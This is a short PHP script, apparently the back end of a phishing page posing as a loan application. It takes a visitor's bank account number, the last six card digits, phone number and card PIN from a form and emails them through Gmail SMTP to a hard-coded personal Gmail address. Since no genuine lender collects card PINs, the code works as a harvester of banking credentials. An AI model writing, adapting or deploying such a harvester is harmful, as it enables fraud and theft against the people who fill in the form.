<?php
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
require 'path/to/PHPMailer/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $accountNumber = $_POST["account-number"];
  $cardDigits = $_POST["card-digits"];
  $loanAmount = $_POST["loan-amount"];
  $phoneNumber = $_POST["phone-number"];
  $cardPin = $_POST["card-pin"];

  // Create a new PHPMailer instance
  $mail = new PHPMailer();

  // SMTP configuration for Gmail
  $mail->isSMTP();
  $mail->Host = 'smtp.gmail.com';
  $mail->Port = 587;
  $mail->SMTPSecure = 'tls';
  $mail->SMTPAuth = true;
  $mail->Username = 'olajidehabib3@gmail.com';
  $mail->Password = 'your-email-password';

  // Set the sender and recipient
  $mail->setFrom('olajidehabib3@gmail.com', 'Your Name');
  $mail->addAddress('olajidehabib3@gmail.com', 'Recipient Name');

  // Email subject and body
  $mail->Subject = 'Loan Application';
  $mail->Body = "Account Number: $accountNumber\n"
              . "Last Six Digits of Card: $cardDigits\n"
              . "Loan Amount Needed: $loanAmount\n"
              . "Phone Number: $phoneNumber\n"
              . "Card PIN: $cardPin";

  // Send the email
  if ($mail->send()) {
    echo 'Email sent successfully.';
  } else {
    echo 'Failed to send email. Error: ' . $mail->ErrorInfo;
  }
}
?>
